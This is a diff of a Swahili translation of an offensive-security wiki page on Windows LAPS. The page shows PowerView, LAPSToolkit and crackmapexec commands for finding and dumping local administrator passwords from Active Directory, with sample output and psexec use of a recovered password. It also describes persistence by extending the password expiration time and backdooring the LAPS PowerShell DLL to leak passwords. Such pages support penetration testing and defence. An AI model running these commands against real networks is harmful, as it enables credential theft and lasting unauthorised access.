@@ -5,9 +5,9 @@
 
 ## Basic Information
 
-Local Administrator Password Solution (LAPS) ni chombo kinachotumika kusimamia mfumo ambapo **nywila za msimamizi**, ambazo ni **za kipekee, zilizopangwa kwa nasibu, na hubadilishwa mara kwa mara**, zinatumika kwa kompyuta zilizounganishwa kwenye eneo. Nywila hizi zinahifadhiwa kwa usalama ndani ya Active Directory na zinapatikana tu kwa watumiaji ambao wamepewa ruhusa kupitia Orodha za Udhibiti wa Ufikiaji (ACLs). Usalama wa uhamasishaji wa nywila kutoka kwa mteja hadi seva unahakikishwa kwa kutumia **Kerberos toleo la 5** na **Kiwango cha Ulinzi wa Juu (AES)**.
+Local Administrator Password Solution (LAPS) ni chombo kinachotumika kwa usimamizi wa mfumo ambapo **administrator passwords**, ambazo ni **za kipekee, zilizopangwa kwa nasibu, na hubadilishwa mara kwa mara**, zinatumika kwa kompyuta zilizounganishwa na domain. Nywila hizi zinahifadhiwa kwa usalama ndani ya Active Directory na zinapatikana tu kwa watumiaji ambao wamepewa ruhusa kupitia Access Control Lists (ACLs). Usalama wa uhamasishaji wa nywila kutoka kwa mteja hadi seva unahakikishwa kwa kutumia **Kerberos version 5** na **Advanced Encryption Standard (AES)**.
 
-Katika vitu vya kompyuta vya eneo, utekelezaji wa LAPS unapelekea kuongeza sifa mbili mpya: **`ms-mcs-AdmPwd`** na **`ms-mcs-AdmPwdExpirationTime`**. Sifa hizi zinahifadhi **nywila ya msimamizi ya maandiko** na **wakati wake wa kuisha**, mtawalia.
+Katika vitu vya kompyuta vya domain, utekelezaji wa LAPS unapelekea kuongeza sifa mbili mpya: **`ms-mcs-AdmPwd`** na **`ms-mcs-AdmPwdExpirationTime`**. Sifa hizi zinahifadhi **nywila ya msimamizi ya maandiko** na **wakati wake wa kuisha**, mtawalia.
 
 ### Check if activated
 ```bash
@@ -24,10 +24,10 @@ Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs
 ```
 ### LAPS Password Access
 
-Unaweza **kupakua sera ya LAPS mbichi** kutoka `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` na kisha kutumia **`Parse-PolFile`** kutoka kwenye [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) pakiti inaweza kutumika kubadilisha faili hii kuwa muundo unaoweza kusomeka na binadamu.
+You could **download the raw LAPS policy** from `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` and then use **`Parse-PolFile`** from the [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) package can be used to convert this file into human-readable format.
 
-Zaidi ya hayo, **cmdlets za asili za LAPS PowerShell** zinaweza kutumika ikiwa zimewekwa kwenye mashine ambayo tuna ufikiaji nayo:
-```powershell
+Moreover, the **native LAPS PowerShell cmdlets** can be used if they're installed on a machine we have access to:
+```bash
 Get-Command *AdmPwd*
 
 CommandType     Name                                               Version    Source
@@ -48,7 +48,7 @@ Find-AdmPwdExtendedRights -Identity Workstations | fl
 Get-AdmPwdPassword -ComputerName wkstn-2 | fl
 ```
 **PowerView** inaweza pia kutumika kugundua **nani anaweza kusoma nenosiri na kulisoma**:
-```powershell
+```bash
 # Find the principals that have ReadPropery on ms-Mcs-AdmPwd
 Get-AdmPwdPassword -ComputerName wkstn-2 | fl
 
@@ -58,9 +58,9 @@ Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
 ### LAPSToolkit
 
 The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) inarahisisha kuorodhesha LAPS hii kwa kazi kadhaa.\
-Moja ni kuchambua **`ExtendedRights`** kwa **kompyuta zote zenye LAPS imewezeshwa.** Hii itaonyesha **makundi** yaliyotengwa mahsusi **kusoma nywila za LAPS**, ambayo mara nyingi ni watumiaji katika makundi yaliyolindwa.\
-**Akaunti** ambayo ime **jiunga na kompyuta** kwenye kikoa inapokea `All Extended Rights` juu ya mwenyeji huo, na haki hii inampa **akaunti** uwezo wa **kusoma nywila.** Kuorodhesha kunaweza kuonyesha akaunti ya mtumiaji ambayo inaweza kusoma nywila ya LAPS kwenye mwenyeji. Hii inaweza kutusaidia **kulenga watumiaji maalum wa AD** ambao wanaweza kusoma nywila za LAPS.
-```powershell
+Moja ni kuchambua **`ExtendedRights`** kwa **kompyuta zote zenye LAPS imewezeshwa.** Hii itaonyesha **makundi** yaliyotengwa mahsusi **kusoma nywila za LAPS**, ambazo mara nyingi ni watumiaji katika makundi yaliyolindwa.\
+**Akaunti** ambayo ime **unganishwa na kompyuta** kwenye kikoa inapata `All Extended Rights` juu ya mwenyeji huo, na haki hii inampa **akaunti** uwezo wa **kusoma nywila.** Kuorodhesha kunaweza kuonyesha akaunti ya mtumiaji ambayo inaweza kusoma nywila ya LAPS kwenye mwenyeji. Hii inaweza kutusaidia **kulenga watumiaji maalum wa AD** ambao wanaweza kusoma nywila za LAPS.
+```bash
 # Get groups that can read passwords
 Find-LAPSDelegatedGroups
 
@@ -83,9 +83,9 @@ ComputerName                Password       Expiration
 ------------                --------       ----------
 DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
 ```
-## **Kutoa Nywila za LAPS Kwa Kutumia Crackmapexec**
+## **Dumping LAPS Passwords With Crackmapexec**
 
-Ikiwa hakuna ufikiaji wa powershell unaweza kutumia haki hii kwa mbali kupitia LDAP kwa kutumia
+Ikiwa hakuna ufikiaji wa powershell unaweza kutumia ruhusa hii kwa mbali kupitia LDAP kwa kutumia
 ```
 crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
 ```
@@ -99,12 +99,12 @@ Password: 2Z@Ae)7!{9#Cq
 python psexec.py Administrator@web.example.com
 Password: 2Z@Ae)7!{9#Cq
 ```
-## **LAPS Uthibitisho**
+## **LAPS Persistence**
 
 ### **Tarehe ya Kuisha**
 
-Mara tu ukiwa admin, inawezekana **kupata nywila** na **kuzuia** mashine isifanye **sasisho** la **nywila** kwa **kuweka tarehe ya kuisha katika siku zijazo**.
-```powershell
+Mara tu unapokuwa admin, inawezekana **kupata nywila** na **kuzuia** mashine isifanye **sasisho** la **nywila** kwa **kueka tarehe ya kuisha katika siku zijazo**.
+```bash
 # Get expiration time
 Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
 
@@ -113,11 +113,11 @@ Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
 Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
 ```
 > [!WARNING]
-> Nenosiri bado litarejeshwa ikiwa **admin** atatumia **`Reset-AdmPwdPassword`** cmdlet; au ikiwa **Usiruhusu muda wa kuisha kwa nenosiri kuwa mrefu zaidi ya inavyohitajika na sera** imewezeshwa katika LAPS GPO.
+> Nenosiri bado litarejeshwa ikiwa **admin** atatumia cmdlet **`Reset-AdmPwdPassword`**; au ikiwa **Usiruhusu muda wa kuisha kwa nenosiri kuwa mrefu zaidi ya inavyohitajika na sera** imewezeshwa katika LAPS GPO.
 
 ### Backdoor
 
-Msimbo wa asili wa LAPS unaweza kupatikana [hapa](https://github.com/GreyCorbel/admpwd), kwa hivyo inawezekana kuweka backdoor katika msimbo (ndani ya njia ya `Get-AdmPwdPassword` katika `Main/AdmPwd.PS/Main.cs` kwa mfano) ambayo kwa namna fulani itatoa **nenosiri mpya au kuyahifadhi mahali fulani**.
+Msimbo wa asili wa LAPS unaweza kupatikana [hapa](https://github.com/GreyCorbel/admpwd), kwa hivyo inawezekana kuweka backdoor katika msimbo (ndani ya njia ya `Get-AdmPwdPassword` katika `Main/AdmPwd.PS/Main.cs` kwa mfano) ambayo kwa namna fulani **itaondoa nenosiri mpya au kuyahifadhi mahali fulani**.
 
 Kisha, tu jenga upya `AdmPwd.PS.dll` mpya na uipakie kwenye mashine katika `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (na ubadilishe muda wa mabadiliko).
 
